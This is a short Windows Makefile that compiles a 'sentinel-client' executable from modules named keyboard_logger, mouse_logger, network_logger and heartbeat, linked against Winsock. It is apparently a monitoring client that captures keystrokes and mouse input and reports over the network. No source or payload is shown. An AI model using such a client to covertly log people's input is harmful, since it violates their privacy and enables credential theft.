CC=gcc.exe
CFLAGS=-Wall
LIBS=-lws2_32

all:
	$(CC) main.c config_loader.c heartbeat.c \
	logger/logger.c \
	keyboard/keyboard_logger.c \
	mouse/mouse_logger.c \
	network/network_logger.c \
	-o sentinel-client.exe $(LIBS)